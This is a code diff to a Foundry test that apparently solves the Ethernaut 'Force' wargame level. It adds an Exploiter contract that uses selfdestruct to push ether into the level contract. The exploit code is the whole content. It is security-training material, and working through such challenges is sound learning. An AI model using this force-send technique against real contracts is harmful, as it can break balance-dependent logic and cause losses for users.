@@ -37,7 +37,14 @@ contract TestForce is BaseTest {
         /** CODE YOUR EXPLOIT HERE */
 
         vm.startPrank(player, player);
-
+        Exploiter exploit = new Exploiter();
+        exploit.attack{value: 1000}(payable(address(level)));
         vm.stopPrank();
+    }
+}
+
+contract Exploiter {
+    function attack(address payable _addr) public payable {
+        selfdestruct(_addr);
     }
 }
